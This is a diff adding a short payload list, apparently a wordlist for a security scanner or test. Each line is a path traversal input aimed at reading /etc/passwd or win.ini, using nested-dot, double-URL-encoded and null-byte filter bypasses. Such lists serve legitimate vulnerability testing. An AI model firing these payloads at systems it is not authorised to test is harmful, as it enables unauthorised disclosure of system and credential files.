@@ -1,0 +1,14 @@
+../../../etc/passwd
+../../../windows\win.ini
+/etc/passwd
+/windows/win.ini
+....//....//....//etc/passwd
+....//....//....//windows/win.ini
+....\/....\/....\/etc/passwd
+....\/....\/....\/windows/win.ini
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66windows/win.ini
+/var/www/images/../../../etc/passwd
+/var/www/images/../../../windows/win.ini
+../../../etc/passwd%00.png
+../../../windows/win.ini%00.png
